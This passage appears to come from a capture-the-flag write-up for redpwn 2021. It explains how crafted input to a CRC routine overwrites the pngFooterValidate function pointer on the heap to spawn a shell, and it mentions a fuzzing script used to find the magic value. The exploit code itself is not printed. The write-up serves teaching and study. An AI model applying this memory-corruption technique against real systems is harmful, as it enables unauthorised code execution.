+<p><img src="https://user-images.githubusercontent.com/73792438/125704298-abf79411-efc7-4d16-b6c5-62f37a9f863d.png" alt="image" /></p>
+
+<p>Next we have our <code class="language-plaintext highlighter-rouge">image_4_bytes</code>. <code class="language-plaintext highlighter-rouge">image_4_bytes+4</code> or rather <code class="language-plaintext highlighter-rouge">crc_write_int</code> is the difference, at the time of the write between the location of <code class="language-plaintext highlighter-rouge">pngFooterValidate</code>
+in <code class="language-plaintext highlighter-rouge">image_fops</code> and our allocation pointer at that time, meaning that when we add that value via 
+<code class="language-plaintext highlighter-rouge">image_alloc = (undefined2 *)((long)(image_alloc + 2) + (ulong)crc_write_int);</code>, <code class="language-plaintext highlighter-rouge">image_alloc</code> will point directly at <code class="language-plaintext highlighter-rouge">pngFooterValidate</code> on the heap.</p>
+
+<p><img src="https://user-images.githubusercontent.com/73792438/125705853-b1216700-2057-4773-8a86-34a654be4d56.png" alt="image" /></p>
+
+<p>Next in the exploit we have a mysterious value, 0xb18 and then padding to satisfy the size for <code class="language-plaintext highlighter-rouge">fread()</code>. So what exactly is this value? Well as you know we want 
+directly control the output from <code class="language-plaintext highlighter-rouge">update_crc</code>, but we do control the input. This value will be passed into <code class="language-plaintext highlighter-rouge">update_crc()</code>, and make it spit our a value with the last
+2 bytes set as 0x1818, and will thus write these 2 bytes into the <code class="language-plaintext highlighter-rouge">pngFooterValidate</code> function pointer:</p>
+
+<p>Before the write:</p>
+
+<p><img src="https://user-images.githubusercontent.com/73792438/125706290-b85026c8-b56c-4fba-99f6-84fc39b791ee.png" alt="image" /></p>
+
+<p>Aaaand after:</p>
+
+<p><img src="https://user-images.githubusercontent.com/73792438/125706329-37f435a7-bfdc-47c8-8806-fabf6bf92c90.png" alt="image" /></p>
+
+<p>Fairly obvious what happens next; when the function pointer is called we drop directly into a shell. BOOM.</p>
+
+<p>I was able to find the 0xb18 value via a wierd, unreliable fuzzing script that does what our exploit does, but feeds different values into <code class="language-plaintext highlighter-rouge">update_crc</code> as it goes.
+It then waits for a small duration and then <code class="language-plaintext highlighter-rouge">p.poll()</code>s the connection. If <code class="language-plaintext highlighter-rouge">p.poll()</code> returned <code class="language-plaintext highlighter-rouge">None</code> we can guess that it maybe just didn’t exit before our arbitrary
+timeout, or more likely just didn’t exit by itself. And this could be a possible indication of us getting a shell/or some other wierdness happening. You can find that
+in this folder.</p>
+
+<p>Sorry this one was a bit long winded, but I got there eventually. This is my last writeup for redpwn 2021. I’m not gonna bother making writeups for the other 3 I solved
+because they were sort of trivial; no one needs a full writeup for those.</p>
+
+<p>HTP</p>
+
+:ET
